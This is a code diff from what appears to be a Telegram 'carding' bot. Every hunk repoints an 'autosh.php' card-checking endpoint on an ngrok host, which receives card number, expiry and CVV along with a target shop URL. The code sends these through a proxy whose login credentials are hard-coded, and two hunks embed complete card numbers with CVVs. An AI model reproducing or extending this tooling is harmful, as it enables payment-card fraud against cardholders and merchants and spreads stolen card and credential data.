@@ -2530,7 +2530,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API URL ---
         api_url = (
-            f"https://edcae9ee471b.ngrok-free.app/autosh.php"
+            f"https://3a61aab8ac0e.ngrok-free.app/autosh.php"
             f"?cc={cc}|{mm}|{yy}|{cvv}"
             "&site=https://tackletech3d.com"
             "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -2698,7 +2698,7 @@ async def process_seturl(user, user_id, site_input, processing_msg):
 
     # --- Prepare API URL ---
     api_url = (
-        "https://edcae9ee471b.ngrok-free.app/autosh.php"
+        "https://3a61aab8ac0e.ngrok-free.app/autosh.php"
         "?cc=4546788796826918|09|2030|781"
         f"&site={site_input}"
         "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -2861,7 +2861,7 @@ async def get_bin_details(bin_number: str) -> dict:
     return bin_data
 
 API_CHECK_TEMPLATE = (
-    "https://edcae9ee471b.ngrok-free.app/autosh.php"
+    "https://3a61aab8ac0e.ngrok-free.app/autosh.php"
     "?cc={card}"
     "&site={site}"
     "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -3028,7 +3028,7 @@ from db import get_user, update_user   # make sure these are imported
 last_site_usage = {}
 
 API_TEMPLATE = (
-    "https://edcae9ee471b.ngrok-free.app/autosh.php"
+    "https://3a61aab8ac0e.ngrok-free.app/autosh.php"
     "?cc=5547300001996183|11|2028|197&site={site_url}"
 )
 
